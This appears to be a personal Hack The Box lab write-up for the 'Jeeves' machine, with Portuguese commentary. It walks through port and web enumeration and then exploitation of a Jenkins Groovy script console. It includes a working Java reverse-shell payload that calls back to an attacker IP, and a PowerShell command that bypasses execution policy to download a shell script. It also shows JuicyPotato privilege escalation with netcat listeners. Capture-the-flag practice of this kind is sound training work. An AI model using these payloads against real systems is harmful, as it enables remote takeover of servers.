Jeeves
========================
# Enumeration

    sudo nmap_enum jeeves.htb | tee nmap_output.txt

![qownnotes-media-ErxBki](../../../media/qownnotes-media-ErxBki.png)

    sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn jeeves.htb | tee nmap_udp_output.txt
 
 ![qownnotes-media-WUkTQI](../../../media/qownnotes-media-WUkTQI.png)
 
    sudo nmap -Pn -n -T5 -sC -p- jeeves.htb | tee nmap_fullportstcp_output.txt
    
![qownnotes-media-RElMdB](../../../media/qownnotes-media-RElMdB.png)

    nikto -host http://10.10.10.63 -T x 6 | tee nikto_80_output.txt
    
    
![qownnotes-media-uMuuTt](../../../media/qownnotes-media-uMuuTt.png)



    nikto -host http://10.10.10.63:50000 -T x 6 | tee nikto_50000_output.txt
    
![qownnotes-media-tdsWHU](../../../media/qownnotes-media-tdsWHU.png)

    
    gobuster dir -u http://10.10.10.63:50000 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_50000_gobuster"

![qownnotes-media-wFoLvy](../../../media/qownnotes-media-wFoLvy.png)


    gobuster dir -u http://10.10.10.63 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_gobuster"
    
![qownnotes-media-mPMUWH](../../../media/qownnotes-media-mPMUWH.png)

Null session

    smbclient -L //10.10.10.63 -U '' -N

![qownnotes-media-CwDUZi](../../../media/qownnotes-media-CwDUZi.png)


    rpcclient -U '' -N 10.10.10.63

![qownnotes-media-QvEoWw](../../../media/qownnotes-media-QvEoWw.png)

Search explolits

    searchsploit jetty

![qownnotes-media-otxabb](../../../media/qownnotes-media-otxabb.png)

![qownnotes-media-XbPSbZ](../../../media/qownnotes-media-XbPSbZ.png)


![qownnotes-media-dqcjOK](../../../media/qownnotes-media-dqcjOK.png)

Aqui um aprendizado interssante que se trata do seguinte... Na enumeração web, utilizar de outras listas de diretórios, pois nesse caso não foi identificado a web management do jenkins:

Então, ficou dessa forrma para detectarmos a web console:

    gobuster dir -u http://10.10.10.63:50000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -k -t 16 -o "tcp_port_protocol_jeeves_gobuster.txt"

![qownnotes-media-AfZgzX](../../../media/qownnotes-media-AfZgzX.png)


![qownnotes-media-bQbdvz](../../../media/qownnotes-media-bQbdvz.png)

# Exploitation

Aqui foi relativamente trivial, pois  com uma pesquisa rápida no google já deu pra chegar na shell rapidinho:

https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/

<https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76>

![qownnotes-media-pFMOLn](../../../media/qownnotes-media-pFMOLn.png)

Basta mudar o IP do exploit e já era:

    String host="10.10.14.8";
    int port=8044;
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


    nc -nlvp 8044

![qownnotes-media-TAQaYz](../../../media/qownnotes-media-TAQaYz.png)

# Privilege Escalation

Primeiro teste e já com sucesso:

    whoam /priv

![qownnotes-media-HlTXtv](../../../media/qownnotes-media-HlTXtv.png)

JuicyPotato na manga:

    copy \\10.10.14.8\smb\"4-privilege escalation\JuicyPotato.exe" jp.exe

![qownnotes-media-rWtOAk](../../../media/qownnotes-media-rWtOAk.png)

    powershell -exec bypass -c "(new-object net.webclient).downloadfile('http://10.10.14.8/shell.bat', 'c:\temp\shell.bat')"
    
    
![qownnotes-media-oIvoPX](../../../media/qownnotes-media-oIvoPX.png)

    jp.exe -t * -p shell.bat -l 4444
    
    nc -nlvp 8082
    
![qownnotes-media-IGhZti](../../../media/qownnotes-media-IGhZti.png)

    Get-ChildItem -Include *.txt -File -Path C: -Recurse -ErrorAction SilentlyContinue
    
    dir /a C:\users\administrator\desktop